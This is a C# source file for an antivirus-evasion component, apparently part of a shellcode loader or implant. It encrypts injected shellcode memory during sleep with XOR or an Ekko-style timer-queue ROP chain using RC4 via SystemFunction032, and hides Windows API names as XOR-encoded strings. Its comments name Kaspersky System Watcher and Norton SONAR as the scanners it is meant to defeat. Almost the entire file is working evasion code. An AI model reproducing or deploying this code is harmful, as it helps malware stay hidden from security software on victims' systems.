#if INJECT
using System;
using System.Runtime.InteropServices;
using System.Threading;

namespace SvcUtil
{
    /// <summary>
    /// Sleep obfuscation: encrypts shellcode memory during sleep to defeat
    /// periodic memory scanners (Kaspersky System Watcher, Norton SONAR).
    ///
    /// Two modes:
    ///   SleepXor  — lightweight XOR encrypt/decrypt around Thread.Sleep
    ///   Sleep     — Ekko-style ROP chain with timer-queue APCs + RC4
    /// </summary>
    internal static class SleepObfuscation
    {
        // ── Constants ──────────────────────────────────────────────

        private const uint PAGE_READWRITE = 0x04;
        private const uint PAGE_EXECUTE_READ = 0x20;
        private const uint MEM_COMMIT = 0x1000;
        private const uint MEM_RESERVE = 0x2000;
        private const uint MEM_RELEASE = 0x8000;
        private const uint INFINITE = 0xFFFFFFFF;
        private const uint WT_EXECUTEINTIMERTHREAD = 0x00000020;
        private const int CONTEXT_SIZE = 2688;
        private const int CONTEXT_FLAGS_OFFSET = 0x30;
        private const int CONTEXT_RCX_OFFSET = 0x80;
        private const int CONTEXT_RDX_OFFSET = 0x88;
        private const int CONTEXT_RSP_OFFSET = 0x98;
        private const int CONTEXT_R8_OFFSET = 0x68;
        private const int CONTEXT_R9_OFFSET = 0x70;
        private const int CONTEXT_RIP_OFFSET = 0xF8;
        private const uint CONTEXT_FULL = 0x10000B;

        // ── XOR key for string encoding ────────────────────────────

        private static readonly byte[] _xk = { 0xDE, 0xAD, 0xBE, 0xEF, 0x42 };

        private static string D(byte[] c)
        {
            byte[] b = new byte[c.Length];
            for (int i = 0; i < c.Length; i++)
                b[i] = (byte)(c[i] ^ _xk[i % _xk.Length]);
            return System.Text.Encoding.UTF8.GetString(b);
        }

        // All encoded strings verified with XOR key {0xDE,0xAD,0xBE,0xEF,0x42}
        private static readonly byte[] _sNtdll =
            { 0xB0, 0xD9, 0xDA, 0x83, 0x2E, 0xF0, 0xC9, 0xD2, 0x83 };
        private static readonly byte[] _sKernel32 =
            { 0xB5, 0xC8, 0xCC, 0x81, 0x27, 0xB2, 0x9E, 0x8C, 0xC1, 0x26, 0xB2, 0xC1 };
        private static readonly byte[] _sAdvapi32 =
            { 0xBF, 0xC9, 0xC8, 0x8E, 0x32, 0xB7, 0x9E, 0x8C, 0xC1, 0x26, 0xB2, 0xC1 };
        private static readonly byte[] _sNtContinue =
            { 0x90, 0xD9, 0xFD, 0x80, 0x2C, 0xAA, 0xC4, 0xD0, 0x9A, 0x27 };
        private static readonly byte[] _sRtlCapture =
            { 0x8C, 0xD9, 0xD2, 0xAC, 0x23, 0xAE, 0xD9, 0xCB, 0x9D, 0x27,
              0x9D, 0xC2, 0xD0, 0x9B, 0x27, 0xA6, 0xD9 };
        private static readonly byte[] _sCreateTimer =
            { 0x9D, 0xDF, 0xDB, 0x8E, 0x36, 0xBB, 0xF9, 0xD7, 0x82, 0x27,
              0xAC, 0xFC, 0xCB, 0x8A, 0x37, 0xBB, 0xF9, 0xD7, 0x82, 0x27, 0xAC };
        private static readonly byte[] _sCreateQueue =
            { 0x9D, 0xDF, 0xDB, 0x8E, 0x36, 0xBB, 0xF9, 0xD7, 0x82, 0x27,
              0xAC, 0xFC, 0xCB, 0x8A, 0x37, 0xBB };
        private static readonly byte[] _sDeleteQueue =
            { 0x9A, 0xC8, 0xD2, 0x8A, 0x36, 0xBB, 0xF9, 0xD7, 0x82, 0x27,
              0xAC, 0xFC, 0xCB, 0x8A, 0x37, 0xBB };
        private static readonly byte[] _sVirtualProtect =
            { 0x88, 0xC4, 0xCC, 0x9B, 0x37, 0xBF, 0xC1, 0xEE, 0x9D, 0x2D,
              0xAA, 0xC8, 0xDD, 0x9B };
        private static readonly byte[] _sSystemFunc032 =
            { 0x8D, 0xD4, 0xCD, 0x9B, 0x27, 0xB3, 0xEB, 0xCB, 0x81, 0x21,
              0xAA, 0xC4, 0xD1, 0x81, 0x72, 0xED, 0x9F };
        private static readonly byte[] _sWaitFor =
            { 0x89, 0xCC, 0xD7, 0x9B, 0x04, 0xB1, 0xDF, 0xED, 0x86, 0x2C,
              0xB9, 0xC1, 0xDB, 0xA0, 0x20, 0xB4, 0xC8, 0xDD, 0x9B };
        private static readonly byte[] _sCreateEvent =
            { 0x9D, 0xDF, 0xDB, 0x8E, 0x36, 0xBB, 0xE8, 0xC8, 0x8A, 0x2C,
              0xAA, 0xFA };
        private static readonly byte[] _sSetEvent =
            { 0x8D, 0xC8, 0xCA, 0xAA, 0x34, 0xBB, 0xC3, 0xCA };
        private static readonly byte[] _sCloseHandle =
            { 0x9D, 0xC1, 0xD1, 0x9C, 0x27, 0x96, 0xCC, 0xD0, 0x8B, 0x2E, 0xBB };

        // ── Delegate types ─────────────────────────────────────────

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate IntPtr DCreateTimerQueue();

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate bool DCreateTimerQueueTimer(
            out IntPtr phNewTimer, IntPtr TimerQueue,
            IntPtr Callback, IntPtr Parameter,
            uint DueTime, uint Period, uint Flags);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate bool DDeleteTimerQueue(IntPtr TimerQueue);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate void DRtlCaptureContext(IntPtr pContext);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate uint DWaitForSingleObject(IntPtr hHandle, uint dwMs);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate IntPtr DCreateEventW(
            IntPtr lpAttr, bool bManualReset, bool bInitialState, IntPtr lpName);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate bool DCloseHandle(IntPtr hObject);

        // ── Resolved function pointers ─────────────────────────────

        private static IntPtr _pNtContinue;
        private static IntPtr _pVirtualProtect;
        private static IntPtr _pSystemFunc032;
        private static IntPtr _pWaitForSingleObject;
        private static IntPtr _pSetEvent;
        private static DCreateTimerQueue _createTimerQueue;
        private static DCreateTimerQueueTimer _createTimerQueueTimer;
        private static DDeleteTimerQueue _deleteTimerQueue;
        private static DRtlCaptureContext _rtlCaptureContext;
        private static DCreateEventW _createEventW;
        private static DCloseHandle _closeHandle;
        private static DWaitForSingleObject _waitForSingleObject;
        private static bool _resolved;

        private static bool Resolve()
        {
            if (_resolved) return true;

            try
            {
                IntPtr hNtdll = W.M0(D(_sNtdll));
                IntPtr hK32 = W.M0(D(_sKernel32));
                IntPtr hAdv = W.M0(D(_sAdvapi32));

                if (hNtdll == IntPtr.Zero || hK32 == IntPtr.Zero)
                    return false;

                _pNtContinue = W.M1(hNtdll, D(_sNtContinue));
                IntPtr pCapture = W.M1(hNtdll, D(_sRtlCapture));
                _pVirtualProtect = W.M1(hK32, D(_sVirtualProtect));
                IntPtr pCreateTimer = W.M1(hK32, D(_sCreateTimer));
                IntPtr pCreateQueue = W.M1(hK32, D(_sCreateQueue));
                IntPtr pDeleteQueue = W.M1(hK32, D(_sDeleteQueue));
                _pWaitForSingleObject = W.M1(hK32, D(_sWaitFor));
                IntPtr pCreateEvent = W.M1(hK32, D(_sCreateEvent));
                _pSetEvent = W.M1(hK32, D(_sSetEvent));
                IntPtr pCloseHandle = W.M1(hK32, D(_sCloseHandle));

                if (hAdv != IntPtr.Zero)
                    _pSystemFunc032 = W.M1(hAdv, D(_sSystemFunc032));

                if (_pNtContinue == IntPtr.Zero || pCapture == IntPtr.Zero ||
                    _pVirtualProtect == IntPtr.Zero || pCreateTimer == IntPtr.Zero ||
                    _pSystemFunc032 == IntPtr.Zero || pCreateEvent == IntPtr.Zero)
                    return false;

                _rtlCaptureContext = (DRtlCaptureContext)
                    Marshal.GetDelegateForFunctionPointer(pCapture, typeof(DRtlCaptureContext));
                _createTimerQueueTimer = (DCreateTimerQueueTimer)
                    Marshal.GetDelegateForFunctionPointer(pCreateTimer, typeof(DCreateTimerQueueTimer));
                _createTimerQueue = (DCreateTimerQueue)
                    Marshal.GetDelegateForFunctionPointer(pCreateQueue, typeof(DCreateTimerQueue));
                _deleteTimerQueue = (DDeleteTimerQueue)
                    Marshal.GetDelegateForFunctionPointer(pDeleteQueue, typeof(DDeleteTimerQueue));
                _createEventW = (DCreateEventW)
                    Marshal.GetDelegateForFunctionPointer(pCreateEvent, typeof(DCreateEventW));
                _closeHandle = (DCloseHandle)
                    Marshal.GetDelegateForFunctionPointer(pCloseHandle, typeof(DCloseHandle));
                _waitForSingleObject = (DWaitForSingleObject)
                    Marshal.GetDelegateForFunctionPointer(
                        _pWaitForSingleObject, typeof(DWaitForSingleObject));

                _resolved = true;
                return true;
            }
            catch
            {
                return false;
            }
        }

        // ── Ekko-style: ROP chain with timer-queue APCs ────────────

        /// <summary>
        /// Sleep for <paramref name="durationMs"/> while the shellcode region
        /// [imageBase, imageBase+imageSize) is RC4-encrypted and marked RW.
        /// On wake: decrypted and restored to RX.
        ///
        /// ROP chain via CreateTimerQueueTimer + NtContinue:
        ///   Timer1: VirtualProtect → RW
        ///   Timer2: SystemFunction032 (RC4 encrypt)
        ///   Timer3: WaitForSingleObject (sleep)
        ///   Timer4: SystemFunction032 (RC4 decrypt — symmetric)
        ///   Timer5: VirtualProtect → RX
        ///   Timer6: SetEvent (wake main thread)
        ///
        /// Falls back to SleepXor if setup fails.
        /// </summary>
        public static void Sleep(IntPtr imageBase, int imageSize, uint durationMs)
        {
            if (!Resolve())
            {
                Thread.Sleep((int)durationMs);
                return;
            }

            // Random RC4 key per cycle — never reused
            byte[] rc4Key = new byte[16];
            var rng = new Random(Environment.TickCount ^
                Thread.CurrentThread.ManagedThreadId);
            rng.NextBytes(rc4Key);

            IntPtr hTimerQueue = IntPtr.Zero;
            IntPtr pCtxOrig = IntPtr.Zero;
            IntPtr pCtxVp1 = IntPtr.Zero;
            IntPtr pCtxEnc = IntPtr.Zero;
            IntPtr pCtxWait = IntPtr.Zero;
            IntPtr pCtxDec = IntPtr.Zero;
            IntPtr pCtxVp2 = IntPtr.Zero;
            IntPtr pCtxResume = IntPtr.Zero;
            IntPtr pRc4Key = IntPtr.Zero;
            IntPtr hEvent = IntPtr.Zero;
            IntPtr pDataUs = IntPtr.Zero;  // UNICODE_STRING for shellcode region
            IntPtr pKeyUs = IntPtr.Zero;   // UNICODE_STRING for RC4 key

            try
            {
                // Allocate CONTEXT structures for the ROP chain
                pCtxOrig = AllocContext();
                pCtxVp1 = AllocContext();
                pCtxEnc = AllocContext();
                pCtxWait = AllocContext();
                pCtxDec = AllocContext();
                pCtxVp2 = AllocContext();
                pCtxResume = AllocContext();

                if (pCtxOrig == IntPtr.Zero)
                {
                    Thread.Sleep((int)durationMs);
                    return;
                }

                // Pin RC4 key
                pRc4Key = Marshal.AllocHGlobal(rc4Key.Length);
                Marshal.Copy(rc4Key, 0, pRc4Key, rc4Key.Length);

                // Build UNICODE_STRING structs for SystemFunction032
                // Layout: USHORT Length (2), USHORT MaxLength (2), padding (4), PVOID Buffer (8) = 16 bytes on x64
                pDataUs = Marshal.AllocHGlobal(16);
                Marshal.WriteInt16(pDataUs, 0, (short)imageSize);         // Length
                Marshal.WriteInt16(pDataUs, 2, (short)imageSize);         // MaximumLength
                Marshal.WriteInt32(pDataUs, 4, 0);                        // padding
                Marshal.WriteIntPtr(pDataUs, 8, imageBase);               // Buffer

                pKeyUs = Marshal.AllocHGlobal(16);
                Marshal.WriteInt16(pKeyUs, 0, (short)rc4Key.Length);      // Length
                Marshal.WriteInt16(pKeyUs, 2, (short)rc4Key.Length);      // MaximumLength
                Marshal.WriteInt32(pKeyUs, 4, 0);                         // padding
                Marshal.WriteIntPtr(pKeyUs, 8, pRc4Key);                  // Buffer

                // Manual-reset event, initially not signaled
                hEvent = _createEventW(IntPtr.Zero, true, false, IntPtr.Zero);
                if (hEvent == IntPtr.Zero)
                {
                    Thread.Sleep((int)durationMs);
                    return;
                }

                hTimerQueue = _createTimerQueue();
                if (hTimerQueue == IntPtr.Zero)
                {
                    Thread.Sleep((int)durationMs);
                    return;
                }

                // Capture current context as template
                _rtlCaptureContext(pCtxOrig);
                long origRsp = Marshal.ReadInt64(pCtxOrig, CONTEXT_RSP_OFFSET);

                // Build contexts for each ROP step
                // Timer 1: VirtualProtect(imageBase, imageSize, RW, &old)
                SetupCtxCall(pCtxVp1, pCtxOrig,
                    _pVirtualProtect, origRsp,
                    imageBase.ToInt64(), (long)imageSize,
                    (long)PAGE_READWRITE, origRsp - 8);

                // Timer 2: SystemFunction032(&dataUs, &keyUs) — encrypt
                // SystemFunction032 takes 2 PUNICODE_STRING args (RCX, RDX)
                SetupCtxCall(pCtxEnc, pCtxOrig,
                    _pSystemFunc032, origRsp,
                    pDataUs.ToInt64(), pKeyUs.ToInt64(), 0, 0);

                // Timer 3: WaitForSingleObject(hEvent, durationMs)
                SetupCtxCall(pCtxWait, pCtxOrig,
                    _pWaitForSingleObject, origRsp,
                    hEvent.ToInt64(), (long)durationMs, 0, 0);

                // Timer 4: SystemFunction032(&dataUs, &keyUs) — decrypt (RC4 is symmetric)
                SetupCtxCall(pCtxDec, pCtxOrig,
                    _pSystemFunc032, origRsp,
                    pDataUs.ToInt64(), pKeyUs.ToInt64(), 0, 0);

                // Timer 5: VirtualProtect(imageBase, imageSize, RX, &old)
                SetupCtxCall(pCtxVp2, pCtxOrig,
                    _pVirtualProtect, origRsp,
                    imageBase.ToInt64(), (long)imageSize,
                    (long)PAGE_EXECUTE_READ, origRsp - 8);

                // Timer 6: SetEvent(hEvent)
                SetupCtxCall(pCtxResume, pCtxOrig,
                    _pSetEvent, origRsp,
                    hEvent.ToInt64(), 0, 0, 0);

                // Queue timers — each fires NtContinue(pCtxXxx, FALSE)
                IntPtr hDummy;
                uint due = 100;
                bool ok = true;

                ok &= QueueTimer(hTimerQueue, pCtxVp1, due, out hDummy);
                due += 100;
                ok &= QueueTimer(hTimerQueue, pCtxEnc, due, out hDummy);
                due += 100;
                ok &= QueueTimer(hTimerQueue, pCtxWait, due, out hDummy);
                due += 100;
                ok &= QueueTimer(hTimerQueue, pCtxDec, due + durationMs, out hDummy);
                due += 100;
                ok &= QueueTimer(hTimerQueue, pCtxVp2, due + durationMs, out hDummy);
                due += 100;
                ok &= QueueTimer(hTimerQueue, pCtxResume, due + durationMs, out hDummy);

                if (!ok)
                {
                    Thread.Sleep((int)durationMs);
                    return;
                }

                // Block until the chain completes
                _waitForSingleObject(hEvent, durationMs + 5000);
            }
            catch
            {
                Thread.Sleep((int)durationMs);
            }
            finally
            {
                if (hTimerQueue != IntPtr.Zero)
                    try { _deleteTimerQueue(hTimerQueue); } catch { }

                FreeContext(pCtxOrig);
                FreeContext(pCtxVp1);
                FreeContext(pCtxEnc);
                FreeContext(pCtxWait);
                FreeContext(pCtxDec);
                FreeContext(pCtxVp2);
                FreeContext(pCtxResume);

                if (pDataUs != IntPtr.Zero)
                    Marshal.FreeHGlobal(pDataUs);
                if (pKeyUs != IntPtr.Zero)
                    Marshal.FreeHGlobal(pKeyUs);

                if (pRc4Key != IntPtr.Zero)
                {
                    for (int i = 0; i < rc4Key.Length; i++)
                        Marshal.WriteByte(pRc4Key, i, 0);
                    Marshal.FreeHGlobal(pRc4Key);
                }

                if (hEvent != IntPtr.Zero)
                    try { _closeHandle(hEvent); } catch { }

                Array.Clear(rc4Key, 0, rc4Key.Length);
            }
        }

        // ── Lightweight: XOR-based sleep obfuscation ───────────────

        /// <summary>
        /// Simpler sleep obfuscation: XOR-encrypt memory, sleep, XOR-decrypt.
        /// No ROP chain — easier to debug and more reliable.
        /// Still effective against basic memory scanners that look for
        /// known shellcode patterns in RX regions.
        /// </summary>
        public static void SleepXor(IntPtr imageBase, int imageSize,
                                     uint durationMs, byte[] key)
        {
            if (imageBase == IntPtr.Zero || imageSize <= 0 || key == null)
            {
                Thread.Sleep((int)durationMs);
                return;
            }

            try
            {
                // Change to RW
                uint oldProtect;
                if (!W.MB(imageBase, (UIntPtr)imageSize,
                        PAGE_READWRITE, out oldProtect))
                {
                    Thread.Sleep((int)durationMs);
                    return;
                }

                // XOR encrypt in place
                XorRegion(imageBase, imageSize, key);

                // Sleep
                Thread.Sleep((int)durationMs);

                // XOR decrypt (symmetric)
                XorRegion(imageBase, imageSize, key);

                // Restore original protection
                uint ignored;
                W.MB(imageBase, (UIntPtr)imageSize,
                    oldProtect, out ignored);
            }
            catch
            {
                // Emergency: try to restore execute permission
                try
                {
                    uint ignored;
                    W.MB(imageBase, (UIntPtr)imageSize,
                        PAGE_EXECUTE_READ, out ignored);
                }
                catch { }
            }
        }

        // ── Helpers ────────────────────────────────────────────────

        private static unsafe void XorRegion(IntPtr addr, int size, byte[] key)
        {
            byte* p = (byte*)addr.ToPointer();
            for (int i = 0; i < size; i++)
                p[i] ^= key[i % key.Length];
        }

        private static IntPtr AllocContext()
        {
            IntPtr p = W.MC(IntPtr.Zero, (UIntPtr)CONTEXT_SIZE,
                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (p != IntPtr.Zero)
            {
                for (int i = 0; i < CONTEXT_SIZE; i++)
                    Marshal.WriteByte(p, i, 0);
            }
            return p;
        }

        private static void FreeContext(IntPtr p)
        {
            if (p != IntPtr.Zero)
                W.MD(p, UIntPtr.Zero, MEM_RELEASE);
        }

        /// <summary>
        /// Set up a CONTEXT to call a function with up to 4 arguments.
        /// x64 ABI: RCX=arg1, RDX=arg2, R8=arg3, R9=arg4
        /// </summary>
        private static void SetupCtxCall(
            IntPtr pCtx, IntPtr pTemplate,
            IntPtr funcAddr, long rsp,
            long arg1, long arg2, long arg3, long arg4)
        {
            // Copy template
            unsafe
            {
                Buffer.MemoryCopy(pTemplate.ToPointer(), pCtx.ToPointer(),
                    CONTEXT_SIZE, CONTEXT_SIZE);
            }

            Marshal.WriteInt32(pCtx, CONTEXT_FLAGS_OFFSET, (int)CONTEXT_FULL);
            Marshal.WriteInt64(pCtx, CONTEXT_RIP_OFFSET, funcAddr.ToInt64());
            Marshal.WriteInt64(pCtx, CONTEXT_RSP_OFFSET, rsp);
            Marshal.WriteInt64(pCtx, CONTEXT_RCX_OFFSET, arg1);
            Marshal.WriteInt64(pCtx, CONTEXT_RDX_OFFSET, arg2);
            Marshal.WriteInt64(pCtx, CONTEXT_R8_OFFSET, arg3);
            Marshal.WriteInt64(pCtx, CONTEXT_R9_OFFSET, arg4);
        }

        private static bool QueueTimer(IntPtr hQueue, IntPtr pCtx,
                                uint dueTime, out IntPtr hTimer)
        {
            return _createTimerQueueTimer(
                out hTimer, hQueue,
                _pNtContinue, pCtx,
                dueTime, 0,
                WT_EXECUTEINTIMERTHREAD);
        }
    }
}
#endif
